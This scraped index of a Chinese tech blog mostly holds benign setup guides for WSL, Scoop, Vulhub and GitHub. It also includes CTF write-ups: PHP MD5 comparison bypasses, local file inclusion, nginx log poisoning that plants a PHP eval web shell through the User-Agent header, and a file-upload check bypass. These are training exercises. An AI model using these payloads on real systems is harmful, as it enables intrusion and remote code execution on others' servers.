\u0026lt;path\u0026gt; disable 4、安装WSL 输入以下命令安装WSL：\nlxrunoffline i -s -n \u0026lt;WSL名称\u0026gt; -d \u0026lt;安装路径\u0026gt; -f \u0026lt;安装包路径\u0026gt;.tar.gz # -s 参数表示在桌面创建WSL快捷图标 四、使用WSL 1、运行WSL 安装完成后我们可通过以下命令运行WSL：\nlxrunoffline r -n \u0026lt;WSL名称\u0026gt;\r2、退出WSL Ctrl+D即可。\n3、创建快捷方式 lxrunoffline s -n \u0026lt;WSL名称\u0026gt; -f \u0026lt;快捷方式路径\u0026gt;.lnk 4、设置默认WSL 设置默认WSL后，我们可在cmd和powershell中输入wsl命令直接调用默认WSL：\nlxrunoffline sd -n \u0026lt;WSL名称\u0026gt; 5、修改WSL名称 查看WSL名称：\nwsl -l 查看WSL安装目录：\nlxrunoffline di -n \u0026lt;WSL名称\u0026gt; 导出指定WSL配置文件到目标路径：\nlxrunoffline ec -n \u0026lt;WSL名称\u0026gt; -f \u0026lt;配置文件路径\u0026gt;.xml 取消注册：\nlxrunoffline ur -n \u0026lt;WSL名称\u0026gt; 使用新名称注册：\nlxrunoffline rg -n \u0026lt;WSL名称\u0026gt; -d \u0026lt;WSL路径\u0026gt; -c \u0026lt;配置文件路径\u0026gt;.xml 五、其它配置 1、设置默认用户 修改过WSL名称或目录后就无法通过微软的官方方法设置默认用户，Create user account for Linux distribution | Microsoft Docs，我们可以通过LxRunOffline进行设置。\n我们首先运行WSL，输入以下命令创建用户：\nuseradd -m -s /bin/bash \u0026lt;用户名\u0026gt; 然后设置密码：\npasswd \u0026lt;用户名\u0026gt; 授予sudo权限：\nusermod -aG sudo \u0026lt;用户名\u0026gt; 查看UID，一般为1000：\nid -u \u0026lt;用户名\u0026gt; Ctrl+D退出WSL，在powershell中输入以下命令：\nlxrunoffline su -n \u0026lt;WSL名称\u0026gt; -v 1000 2、转移WSL安装目录 查看已安装的WSL：\nlxrunoffline l\r移动目录：\nlxrunoffline m -n \u0026lt;WSL名称\u0026gt; -d \u0026lt;路径\u0026gt; 查看路径：\nlxrunoffline di -n \u0026lt;WSL名称\u0026gt; 3、备份、恢复WSL 备份：\nlxrunoffline e -n \u0026lt;WSL名称\u0026gt; -f \u0026lt;压缩包路径\u0026gt;.tar.gz 恢复：\nlxrunoffline i -n \u0026lt;WSL名称\u0026gt; -d \u0026lt;安装路径\u0026gt; -f \u0026lt;压缩包路径\u0026gt;.tar.gz 六、WSL无法ping通主机 安装好相关工具后发现主机能ping通WSL，但WSL无法ping通主机，盲猜是防火墙的问题。\n按一下Windows键，打开控制面板，选择高级设置=\u0026gt;入站规则=\u0026gt;新建规则=\u0026gt;自定义=\u0026gt;所有程序=\u0026gt;任何=\u0026gt;在应用于哪些本地IP地址选择任何IP地址，在应用于哪些远程IP地址选择下列IP地址，然后粘贴通过ifconfig命令查看到的WSL的IP=\u0026gt;后面全点下一步，给规则起名称的时候按个人喜好，能有明显的区分度，笔者设置为WSL2。至此，WSL就能成功ping通主机了。\n 本文链接：LxRunOffline使用手册 | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/lxrunoffline/","summary":"一、简介 WSL有多香就不介绍了，但其原生命令较为简陋、默认安装在C盘，稍有不足。而LxRunOffline能够安装任意发行版系统到任意目录，且具备转移已安装WSL目录、备份等功能，是一个极好的WSL管理软件。\n项目地址：GitHub - DDoSolitary/LxRunOffline: A full-featured utility for managing Windows Subsystem for Linux (WSL)\n二、安装LxRunOffline  常规安装：下载项目，手动安装 通过Chocolatey安装：  choco install lxrunoffline  通过Scoop安装：  scoop bucket add extras scoop install lxrunoffline LxRunOffline参数介绍：\nl , list - 列出所有已安装的发行版。\rgd , get-default - 获取 bash.exe 使用的默认发行版。\rsd , set-default - 设置 bash.exe 使用的默认发行版。\ri , install - 安装新的发行版。\rsd , set-default - 设置 bash.exe 使用的默认发行版。\rui , uninstall - 卸载发行版。\rrg , register - 注册现有的安装目录。\rur , unregister - 取消注册发行版但不删除安装目录。\rm , move - 将发行版移动到新目录。\rd , duplicate - 在新目录中复制现有发行版。\re , export - 将发行版的文件系统导出到.","title":"LxRunOffline使用手册"},{"content":"Scoop简介 Scoop是一个包管理工具，类似Ubuntu的apt和Mac的homebrew，只需通过一条命令即可快速完成软件的下载、安装和配置等步骤。\n项目地址：GitHub - lukesampson/scoop: A command-line installer for Windows.\nScoop安装 没什么问题的话，大部分的电脑都能直接安装scoop，有问题的话请参考官方文档和网络资料自行解决，本文仅描述scoop的安装过程及实际安装遇到的问题。\n注：请确保自身有代理环境，也可自行查找镜像源安装。\n默认安装 官方给出的安装命令如下，只需打开powershell粘贴并执行即可，scoop将被默认安装在C:\\User\\\u0026lt;username\u0026gt;\\scoop目录：\nInvoke-Expression (New-Object System.Net.WebClient).DownloadString(\u0026#39;https://get.scoop.sh\u0026#39;) # 或下述命令，任一条均可 iwr -useb get.scoop.sh | iex 安装完成后，可通过输入scoop help命令查看命令帮助，确认是否安装成功。\n更改scoop安装位置 在安装scoop前，可先通过配置环境变量改变scoop安装路径：\n$env:SCOOP=\u0026#39;D:\\\u0026lt;dirname\u0026gt;\u0026#39; [Environment]::SetEnvironmentVariable(\u0026#39;SCOOP\u0026#39;, $env:SCOOP, \u0026#39;User\u0026#39;) 若已经安装scoop，则仅需在执行上述命令后，将原目录所有文件复制到新指定的目录即可。\n更改scoop全局程序安装位置 $env:SCOOP_GLOBAL=\u0026#39;D:\u0026lt;dirname\u0026gt;\u0026#39; [Environment]::SetEnvironmentVariable(\u0026#39;SCOOP_GLOBAL\u0026#39;, $env:SCOOP_GLOBAL, \u0026#39;Machine\u0026#39;) 如果直接执行上述命令可能会报错，原因在于权限不够，使用Windows+X，选择以管理员身份打开powershell，再次运行命令即可。\n多线程下载 查阅资料的时候，大部分文章都推荐安装aria2实现多线程下载，提高下载速度，命令如下：\nscoop install aria2 安装Typora 以下是通过scoop安装Typora的流程，先使用命令搜索一下软件信息：\nscoop search typora\r会有一个报错，大意为typora在extras软件库中，要求我们先安装对应软件库。按照要求执行命令添加软件库：\nscoop bucket add extras\r此时却又报错，提示需要从GitHub拉取项目，需要我们先安装git。安装git:\nscoop install git\r下载失败并报错，但之前都能正常下载，目前只安装了一个aria2，先禁用了看看：\nscoop config aria2-enabled false\raria2默认配置：\naria2-enabled (默认值: true)\raria2-retry-wait (默认值: 2)\raria2-split (默认值: 5)\raria2-max-connection-per-server (默认值: 5)\raria2-min-split-size (默认值: 5M)\r然后再下载git，成功下载，但是在安装软件库时又报错了，显示无法访问GitHub仓库，这可是个老问题了，项目部署经常遇到，检查代理没问题，那么就给git配个代理试试：\ngit config --global http.proxy http://127.0.0.1:7890\r再次安装软件库，成功安装，后续再使用命令安装Typora即可。\n总结 软件安装 1、安装前先搜索看看\nscoop search \u0026lt;package-name\u0026gt;\r2、安装\nscoop install \u0026lt;package-name\u0026gt;\r3、安装到全局目录\nscoop install -g \u0026lt;package-name\u0026gt;\r4、卸载\nscoop uninstall uninstall \u0026lt;package-name\u0026gt;\r软件库 可以在GitHub项目仓库找软件库，以下列出十一个软件库：\n1、main - Default bucket for the most common (mostly CLI) apps\n2、extras - Apps that don’t fit the main bucket’s criteria\n3、games - Open source/freeware games and game-related tools\n4、nerd-fonts - Nerd Fonts\n5、nirsoft - A subset of the 250 Nirsoft apps\n6、java - Installers for Oracle Java, OpenJDK, Zulu, ojdkbuild, AdoptOpenJDK, 7、Amazon Corretto, BellSoft Liberica \u0026amp; SapMachine\n8、jetbrains - Installers for all JetBrains utilities and IDEs\n9、nonportable - Non-portable apps (may require UAC)\n10、php - Installers for most versions of PHP\n11、versions - Alternative versions of apps found in other buckets\n软件库添加方式：\nscoop bucket add \u0026lt;bucket-name\u0026gt;\r 本文链接：Scoop使用手册 | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/scoop%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/","summary":"Scoop简介 Scoop是一个包管理工具，类似Ubuntu的apt和Mac的homebrew，只需通过一条命令即可快速完成软件的下载、安装和配置等步骤。\n项目地址：GitHub - lukesampson/scoop: A command-line installer for Windows.\nScoop安装 没什么问题的话，大部分的电脑都能直接安装scoop，有问题的话请参考官方文档和网络资料自行解决，本文仅描述scoop的安装过程及实际安装遇到的问题。\n注：请确保自身有代理环境，也可自行查找镜像源安装。\n默认安装 官方给出的安装命令如下，只需打开powershell粘贴并执行即可，scoop将被默认安装在C:\\User\\\u0026lt;username\u0026gt;\\scoop目录：\nInvoke-Expression (New-Object System.Net.WebClient).DownloadString(\u0026#39;https://get.scoop.sh\u0026#39;) # 或下述命令，任一条均可 iwr -useb get.scoop.sh | iex 安装完成后，可通过输入scoop help命令查看命令帮助，确认是否安装成功。\n更改scoop安装位置 在安装scoop前，可先通过配置环境变量改变scoop安装路径：\n$env:SCOOP=\u0026#39;D:\\\u0026lt;dirname\u0026gt;\u0026#39; [Environment]::SetEnvironmentVariable(\u0026#39;SCOOP\u0026#39;, $env:SCOOP, \u0026#39;User\u0026#39;) 若已经安装scoop，则仅需在执行上述命令后，将原目录所有文件复制到新指定的目录即可。\n更改scoop全局程序安装位置 $env:SCOOP_GLOBAL=\u0026#39;D:\u0026lt;dirname\u0026gt;\u0026#39; [Environment]::SetEnvironmentVariable(\u0026#39;SCOOP_GLOBAL\u0026#39;, $env:SCOOP_GLOBAL, \u0026#39;Machine\u0026#39;) 如果直接执行上述命令可能会报错，原因在于权限不够，使用Windows+X，选择以管理员身份打开powershell，再次运行命令即可。\n多线程下载 查阅资料的时候，大部分文章都推荐安装aria2实现多线程下载，提高下载速度，命令如下：\nscoop install aria2 安装Typora 以下是通过scoop安装Typora的流程，先使用命令搜索一下软件信息：\nscoop search typora\r会有一个报错，大意为typora在extras软件库中，要求我们先安装对应软件库。按照要求执行命令添加软件库：\nscoop bucket add extras\r此时却又报错，提示需要从GitHub拉取项目，需要我们先安装git。安装git:\nscoop install git\r下载失败并报错，但之前都能正常下载，目前只安装了一个aria2，先禁用了看看：\nscoop config aria2-enabled false\raria2默认配置：\naria2-enabled (默认值: true)\raria2-retry-wait (默认值: 2)\raria2-split (默认值: 5)\raria2-max-connection-per-server (默认值: 5)\raria2-min-split-size (默认值: 5M)\r然后再下载git，成功下载，但是在安装软件库时又报错了，显示无法访问GitHub仓库，这可是个老问题了，项目部署经常遇到，检查代理没问题，那么就给git配个代理试试：","title":"Scoop使用手册"},{"content":"文章背景 突发奇想能不能配置多个GitHub Pages，然后分别给它们绑定一个子域名，说干就干。\n博客搭建文章：博客搭建 | Atmet (oopsdc.tk)\nGitHub Pages有三种类型：项目、用户和组织，项目站点连接到GitHub托管的特定项目，后两者连接到特定GitHub账户。用户只能创建一个用户主站，但可以有多个项目站点。\n创建项目  创建一个新的名称为test的公开仓库。 进入仓库主页，点击Settings，点击左侧的Pages，选择Launch automatic page generator\u0026gt;Continue to layouts\u0026gt;Pubulish Page。（注：此处选择一个喜欢的主题即可） 搭建完成后可通过\u0026lt;usernmae\u0026gt;.github.io/test访问。  绑定子域名 一般而言，在购买一个域名后，我们可以使用它的子域名，如本博客的域名为oopsdc.tk，现在我想给新创建的test仓库绑定一个test.oopsdc.tk的子域名。\n1.进入DNS服务商的控制台，此处以CloudFlare为例，点击新建一个CNAME，设置如下：\n保存后进入第二步。\n2.在test仓库中新建一个CNAME文件，内容如下：\ntest.oopsdc.tk\r也可通过仓库中的Settings进行设置，选择Pages后，修改下面的Custom domain并保存即可。\n 本文链接：如何拥有多个GitHub Pages并配置子域名 | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/%E5%A6%82%E4%BD%95%E6%8B%A5%E6%9C%89%E5%A4%9A%E4%B8%AAgithub-pages%E5%B9%B6%E9%85%8D%E7%BD%AE%E5%AD%90%E5%9F%9F%E5%90%8D/","summary":"文章背景 突发奇想能不能配置多个GitHub Pages，然后分别给它们绑定一个子域名，说干就干。\n博客搭建文章：博客搭建 | Atmet (oopsdc.tk)\nGitHub Pages有三种类型：项目、用户和组织，项目站点连接到GitHub托管的特定项目，后两者连接到特定GitHub账户。用户只能创建一个用户主站，但可以有多个项目站点。\n创建项目  创建一个新的名称为test的公开仓库。 进入仓库主页，点击Settings，点击左侧的Pages，选择Launch automatic page generator\u0026gt;Continue to layouts\u0026gt;Pubulish Page。（注：此处选择一个喜欢的主题即可） 搭建完成后可通过\u0026lt;usernmae\u0026gt;.github.io/test访问。  绑定子域名 一般而言，在购买一个域名后，我们可以使用它的子域名，如本博客的域名为oopsdc.tk，现在我想给新创建的test仓库绑定一个test.oopsdc.tk的子域名。\n1.进入DNS服务商的控制台，此处以CloudFlare为例，点击新建一个CNAME，设置如下：\n保存后进入第二步。\n2.在test仓库中新建一个CNAME文件，内容如下：\ntest.oopsdc.tk\r也可通过仓库中的Settings进行设置，选择Pages后，修改下面的Custom domain并保存即可。\n 本文链接：如何拥有多个GitHub Pages并配置子域名 | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","title":"如何拥有多个GitHub Pages并配置子域名"},{"content":"安装环境  Ubuntu 20.04  环境配置  docker docker-compose  更换系统源 备份原文件：\nmv /etc/apt/source.list /etc/apt/source.list.bak 使用以下任一命令创建并编辑source.list文件：\ngedit /etc/apt/source.list vi /etc/apt/source.list vim /etc/apt/source.list\t// 需使用 apt install vim 命令安装 文件内容如下：\n# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释\rdeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse\r# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse\rdeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse\r# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse\rdeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse\r# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse\rdeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse\r# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse\r# 预发布软件源，不建议启用\r# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse\r# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse\r更新系统软件包：\napt update \u0026amp;\u0026amp; apt upgrade -y 安装环境 安装docker：\napt install docker.io 安装docker-compose：\napt install docker-compose 更换docker源 创建并编辑daemon.json文件：\ngedit /etc/docker/daemon.json vi /etc/docker/daemon.json vim /etc/docker/daemon.json\t// 需使用 apt install vim 命令安装 内容如下：\n{ \u0026#34;registry-mirrors\u0026#34;: [\u0026#34;http://hub-mirror.c.163.com\u0026#34;] } // 其余镜像地址如下，选其一即可 Docker中国区官方镜像 https://registry.docker-cn.com 网易 http://hub-mirror.c.163.com ustc https://docker.mirrors.ustc.edu.cn 中国科技大学 https://docker.mirrors.ustc.edu.cn 重启docker服务 systemctl daemon-reload systemctl restart docker 漏洞环境搭建 切换到对应目录，使用如下命令部署：\ndocker-compose up -d 查看配置文件：\nvim docker-compose.yml 停止服务：\ndocker-compose down\r 本文链接：vulhub环境搭建 | Atmet\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/vulhub%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","summary":"安装环境  Ubuntu 20.04  环境配置  docker docker-compose  更换系统源 备份原文件：\nmv /etc/apt/source.list /etc/apt/source.list.bak 使用以下任一命令创建并编辑source.list文件：\ngedit /etc/apt/source.list vi /etc/apt/source.list vim /etc/apt/source.list\t// 需使用 apt install vim 命令安装 文件内容如下：\n# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释\rdeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse\r# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse\rdeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse\r# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse\rdeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse\r# deb-src https://mirrors.","title":"Vulhub环境搭建"},{"content":"问题描述 在更新博客push本地资源时遇到如下报错：\nremote: Support for password authentication was removed on August 13, 2021. Please use a personal access token instead.\r大意就是GitHub从13号起不再支持密码验证，需要使用个人token，官方解释是为了安全。\n解决方案 进入GitHub首页后点击右上角的个人头像，选择Settings，在左侧选择Developer settings，然后选择Personal access tokens，选中之后点击Generate new token，我们可以设置token名、有效期及token的权限范围。仅需要仓库部署的话，我们就只需勾选repo，翻到最下面点击Gererate token。\n然后保存好生成的token，因为退出页面后将不再显示，可以通过重新生成来重新获取。然后在push项目时，将输入的密码改为我们生成的token即可。\n 本文链接：GitHub不再支持密码验证解决方案 | Atmet\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/github%E4%B8%8D%E5%86%8D%E6%94%AF%E6%8C%81%E5%AF%86%E7%A0%81%E9%AA%8C%E8%AF%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/","summary":"问题描述 在更新博客push本地资源时遇到如下报错：\nremote: Support for password authentication was removed on August 13, 2021. Please use a personal access token instead.\r大意就是GitHub从13号起不再支持密码验证，需要使用个人token，官方解释是为了安全。\n解决方案 进入GitHub首页后点击右上角的个人头像，选择Settings，在左侧选择Developer settings，然后选择Personal access tokens，选中之后点击Generate new token，我们可以设置token名、有效期及token的权限范围。仅需要仓库部署的话，我们就只需勾选repo，翻到最下面点击Gererate token。\n然后保存好生成的token，因为退出页面后将不再显示，可以通过重新生成来重新获取。然后在push项目时，将输入的密码改为我们生成的token即可。\n 本文链接：GitHub不再支持密码验证解决方案 | Atmet\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","title":"GitHub不再支持密码验证解决方案"},{"content":"环境配置 本文环境信息如下：\n Parallel Desktop 16 Business 16.5.0 (49183) Kali Linux 2021.2 64-Bit  系统安装 安装配置 安装Kali Linux的时候Parallels Desktop无法识别操作系统，需要我们手动选择Other Linux下的Kali Linux。\n配置选项因人而异，此处不细讲。\n在安装过程中可选择GNOME作为桌面环境，避免后面的踩坑。\n更换国内源 # 备份原文件 mv /etc/apt/source.list /etc/apt/source.list.bak # 更换为清华源 vim /etc/apt/source.list # 输入以下内容 \u0026#34;deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\u0026#34; \u0026#34;deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\u0026#34; 安装Parallels Tools 把鼠标移到窗口的右上，有一个黄色的感叹符号，点击即可安装Parallels Tools。\n# 检测光盘是否挂载成功 mount | grep iso9660 # 将安装文件拷贝至本地，此处的dirname为自己创建的目录名称 mkdir ~/\u0026lt;dirname\u0026gt; \u0026amp;\u0026amp; cp -r /media/cdrom0/* ~/\u0026lt;dirname\u0026gt; # 安装Parallels Tools cd ~/\u0026lt;dirname\u0026gt; \u0026amp;\u0026amp; ./install 进入安装流程后，一直点回车，然后我们会得到大致如下的报错：\nAn error occured while installing the following packages: - linux-headers-5.10.0-kali3-amd64 - dkms Install these packages manually and start the Parallels Tools installation again. 问题的原因在于Kali更新内核后，修改了几个内核函数的名称，而Parallels Tools没有推出兼容方案，导致无法安装。\n解决报错 上述报错大意为安装那两个包即可，我们尝试手动安装：\n# 更新源 apt update \u0026amp;\u0026amp; apt upgrade # 安装内核头 apt install linux-headers-$(uname -r) 然后又会报错：\nUnable to locate package linux-headers-5.10.0-kali3-amd64 Couldn't find any package by glob 'linux-headers-5.10.0-kali3-amd' 源文件中没有头文件的包，所以需要我们手动下载头文件，我们手动下载一下文件：\nIndex of /kali/pool/main/l/linux\n我们先使用如下命令查看自己的Linux内核版本：\necho $(uname -r) 我这里的信息为：\n5.10.0-kali7-amd64 # 下载内核头依赖并命名为 common.deb wget -O common.deb http://old.kali.org/kali/pool/main/l/linux/linux-headers-5.10.0-kali3-common_5.10.13-1kali1_all.deb # 下载内核头并命名为 headers.deb wget -O headers.deb http://old.kali.org/kali/pool/main/l/linux/linux-headers-5.10.0-kali3-amd64_5.10.13-1kali1_amd64.deb # 安装辅助 deb 安装工具 apt install gdebi -y # 安装 common 内核头依赖 gdebi common.deb # 安装内核头 gdebi headers.deb # 验证是否安装成功 apt install linux-headers-$(uname -r) 踩坑点 Kali 2021默认为xfce桌面环境，在安装Parallels Toolsh后，打开某些应用的情况下会出现白屏的情况，所以我们换成GNOME桌面环境：\napt install kali-desktop-gnome -y 安装过程中我们需要选择gdm3作为显示管理器，安装完成后我们再回到之前的目录安装Parallels Tools：\ncd ~/\u0026lt;dirname\u0026gt; \u0026amp;\u0026amp; ./install 一路安装之后，会显示重启，安装步骤就此完成。\n 本文链接：Kali安装Parallels Tools | Atmet\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/kali%E5%AE%89%E8%A3%85parallels-tools/","summary":"环境配置 本文环境信息如下：\n Parallel Desktop 16 Business 16.5.0 (49183) Kali Linux 2021.2 64-Bit  系统安装 安装配置 安装Kali Linux的时候Parallels Desktop无法识别操作系统，需要我们手动选择Other Linux下的Kali Linux。\n配置选项因人而异，此处不细讲。\n在安装过程中可选择GNOME作为桌面环境，避免后面的踩坑。\n更换国内源 # 备份原文件 mv /etc/apt/source.list /etc/apt/source.list.bak # 更换为清华源 vim /etc/apt/source.list # 输入以下内容 \u0026#34;deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\u0026#34; \u0026#34;deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\u0026#34; 安装Parallels Tools 把鼠标移到窗口的右上，有一个黄色的感叹符号，点击即可安装Parallels Tools。\n# 检测光盘是否挂载成功 mount | grep iso9660 # 将安装文件拷贝至本地，此处的dirname为自己创建的目录名称 mkdir ~/\u0026lt;dirname\u0026gt; \u0026amp;\u0026amp; cp -r /media/cdrom0/* ~/\u0026lt;dirname\u0026gt; # 安装Parallels Tools cd ~/\u0026lt;dirname\u0026gt; \u0026amp;\u0026amp; .","title":"Kali安装Parallels Tools"},{"content":"示例代码：\nif (md5($_POST[\u0026#39;md51\u0026#39;]) == md5($_POST[\u0026#39;md52\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;md51\u0026#39;] != $_POST[\u0026#39;md52\u0026#39;]) 弱类型绕过 PHP在处理哈希字符串时，会把每一个0E开头的哈希值解释为0，所以若两个不同密码进行哈希后以0E开头，则会被认为值均为0，从而判等。\nmd5加密后开头为0E的值：\nQNKCDZO\r240610708\rs878926199a\rs155964671a\rs214587387a\rs214587387a\r以示例代码为例，分别给md51和md52赋表中不同的值。经过md5加密后，值均为0，而原始值又不同，顺利绕过if判断。\n数组绕过 md5()函数无法处理数组，会对传入的数组返回NULL，即数组经过md5加密后均得到NULL。\n我们仅需传入如下数据即可，数组内容随意：\nmd51[]=1\u0026amp;md52[]=2  本文链接：MD5()函数绕过 | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/md5%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/","summary":"示例代码：\nif (md5($_POST[\u0026#39;md51\u0026#39;]) == md5($_POST[\u0026#39;md52\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;md51\u0026#39;] != $_POST[\u0026#39;md52\u0026#39;]) 弱类型绕过 PHP在处理哈希字符串时，会把每一个0E开头的哈希值解释为0，所以若两个不同密码进行哈希后以0E开头，则会被认为值均为0，从而判等。\nmd5加密后开头为0E的值：\nQNKCDZO\r240610708\rs878926199a\rs155964671a\rs214587387a\rs214587387a\r以示例代码为例，分别给md51和md52赋表中不同的值。经过md5加密后，值均为0，而原始值又不同，顺利绕过if判断。\n数组绕过 md5()函数无法处理数组，会对传入的数组返回NULL，即数组经过md5加密后均得到NULL。\n我们仅需传入如下数据即可，数组内容随意：\nmd51[]=1\u0026amp;md52[]=2  本文链接：MD5()函数绕过 | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","title":"MD5()函数绕过"},{"content":"Basic Linux Labs  2020年10月24日 更新：目前所有靶机均能直接访问互联网。\n点击启动靶机可以启动一台安装好了 LAMP 的机器。\n并且这台机器位于靶机内网，所有动态靶机均可直接通过主机名访问这台机器。\n但由于目前一个账户只能同时启动一台靶机，您如果有需要建议浏览器开一个隐私窗口，注册一个新账号来启动这个靶机。\nssh 用户名：root 密码：123456 地址和端口为动态分配的。\n 开启环境后按照题目给定地址和端口使用SSH连接即可。\n连接上云主机后使用ls命令，发现当前用户家目录下啥也没有，再使用cd ..命令切换到根目录下看看，发现flag.txt文件。\n也可直接使用cat /flag.txt命令查看flag。\nBUU LFI COURSE 1 启动环境后得到如下PHP代码：\n\u0026lt;?php /** * Created by PhpStorm. * User: jinzhao * Date: 2019/7/9 * Time: 7:07 AM */ highlight_file(__FILE__); if(isset($_GET[\u0026#39;file\u0026#39;])) { $str = $_GET[\u0026#39;file\u0026#39;]; include $_GET[\u0026#39;file\u0026#39;]; } 本地文件包含，通过file参数进行传参，可在URL后构造参数?file=/flag查看flag。\n拓展 通过Wappalyzer插件可以发现网站使用了nginx服务，尝试访问nginx访问日志：\n?file=/var/log/nginx/access.log\r页面回显出我们刚才的访问记录，接下来我们使用bp抓包尝试写入phpinfo。\n通过在User-Agent字段最后插入aaaaaaa\u0026lt;?php phpinfo();?\u0026gt;bbbbbbb传入phpinfo()，刷新页面后检查是否传入成功。\nRequest请求包如下：\nGET /?file=/var/log/nginx/access.log HTTP/1.1\rHost: \u0026lt;domain\u0026gt;:\u0026lt;port\u0026gt;\rCache-Control: max-age=0\rUpgrade-Insecure-Requests: 1\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36aaaaaaa\u0026lt;?php phpinfo();?\u0026gt;bbbbbbb\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\rAccept-Encoding: gzip, deflate\rAccept-Language: en-US,en;q=0.9\rConnection: close\r依照上述方法，我们还可直接上传一句话木马进行连接：\nGET /?file=/var/log/nginx/access.log HTTP/1.1\rHost: \u0026lt;domain\u0026gt;:\u0026lt;port\u0026gt;\rCache-Control: max-age=0\rUpgrade-Insecure-Requests: 1\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36aaaaaaa\u0026lt;?php @eval($_POST['cmd']);?\u0026gt;bbbbbbb\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\rAccept-Encoding: gzip, deflate\rAccept-Language: en-US,en;q=0.9\rConnection: close\rShell url: http://\u0026lt;domain\u0026gt;:\u0026lt;port\u0026gt;/?file=/var/log/nginx/access.log\rShell pwd: cmd\rUpload-Labs-Linux 是一个在线的Uplaod-Labs靶场。\n我们先过第一关，题目要求上传一个webshell到服务器，写个一句话php马：\n\u0026lt;?php @eval($_POST[\u0026#39;cmd\u0026#39;]);?\u0026gt;点击上传时却显示文件格式不符合要求，盲猜只有一个前端验证。\n将webshell.php改为webshell.jpg，然后使用bp抓取上传文件时的数据包，放到Repeater模块，将下面的webshell.jpg改为webshell.php即可：\n------WebKitFormBoundaryDSXCGFcAK1IJkpgn\rContent-Disposition: form-data; name=\u0026quot;upload_file\u0026quot;; filename=\u0026quot;webshell.jpg\u0026quot;\rBUU CODE REVIEW 1 启动环境后得到如下PHP代码：\n\u0026lt;?php /** * Created by PhpStorm. * User: jinzhao * Date: 2019/10/6 * Time: 8:04 PM */ highlight_file(__FILE__); class BUU { public $correct = \u0026#34;\u0026#34;; public $input = \u0026#34;\u0026#34;; public function __destruct() { try { $this-\u0026gt;correct = base64_encode(uniqid()); if($this-\u0026gt;correct === $this-\u0026gt;input) { echo file_get_contents(\u0026#34;/flag\u0026#34;); } } catch (Exception $e) { } } } if($_GET[\u0026#39;pleaseget\u0026#39;] === \u0026#39;1\u0026#39;) { if($_POST[\u0026#39;pleasepost\u0026#39;] === \u0026#39;2\u0026#39;) { if(md5($_POST[\u0026#39;md51\u0026#39;]) == md5($_POST[\u0026#39;md52\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;md51\u0026#39;] != $_POST[\u0026#39;md52\u0026#39;]) { unserialize($_POST[\u0026#39;obj\u0026#39;]); } } } 